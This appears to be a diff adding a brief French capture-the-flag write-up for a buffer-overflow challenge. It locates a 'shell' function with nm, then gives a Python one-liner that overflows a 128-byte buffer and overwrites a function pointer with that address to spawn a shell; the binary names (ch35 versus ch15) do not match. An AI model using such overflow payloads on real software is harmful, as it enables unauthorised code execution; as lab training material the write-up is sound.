@@ -1,0 +1,5 @@
+On cherche l’adresse de la fonction "shell"
+nm ./ch35 | grep "shell"
+On vois que le buffer ne peut stocker que 127 caracteres alors qu'un taille de 133 est aloue pour le fgets. il faut donc remplir les 128 octets.
+Puis on deborde le buffer jusqu'a arriver sur l'adresse de func() qu'on va remplacer avec celle de shell().
+(python -c 'print "A"*128 +"\x64\x84\x04\x08" ' ;cat) | ./ch15
